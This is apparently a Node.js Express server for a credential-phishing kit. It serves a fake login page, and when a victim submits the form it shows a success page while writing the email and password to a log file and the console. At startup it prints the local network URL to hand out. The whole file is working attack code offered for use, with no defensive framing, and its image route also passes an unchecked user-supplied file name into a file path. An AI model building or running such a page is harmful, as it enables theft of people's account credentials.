const express = require('express');
const exphbs = require('express-handlebars');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const os = require('os');

const app = express();

// Find the IP address dynamically
let ipAddress;
const networkInterfaces = os.networkInterfaces();
const interfaces = Object.keys(networkInterfaces);
for (const iface of interfaces) {
    const addresses = networkInterfaces[iface];
    for (const addr of addresses) {
        if (addr.family === 'IPv4' && !addr.internal) {
            ipAddress = addr.address;
            break;
        }
    }
    if (ipAddress) break;
}

const port = 3000;
const predefinedUrl = `http://${ipAddress}:${port}`;

// Set up Handlebars as the view engine
app.engine('handlebars', exphbs({ defaultLayout: 'main' }));
app.set('view engine', 'handlebars');

// Body parser middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Serve static files
app.use('/images', express.static('images'));

// Route for the login page
app.get('/', (req, res) => {
    res.render('f_login');
});

// Route for form submission
app.post('/_', (req, res) => {
    res.render('f_success');
    const capturedContent = `\n[-] Email: ${req.body.email} Password: ${req.body.password}`;
    fs.appendFile('logs.txt', capturedContent, err => {
        if (err) {
            console.error(err);
        }
    });
    console.log(capturedContent);
});

// Serve static images
app.get('/images/:imageName', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'images', req.params.imageName));
});

// Start the server
app.listen(port, () => {
    console.log('[!] Server Running!');
    console.log(`[!] Your server is running on http://localhost:${port}`);
    console.log(`[!] You can access your predefined URL at: ${predefinedUrl}`);
});

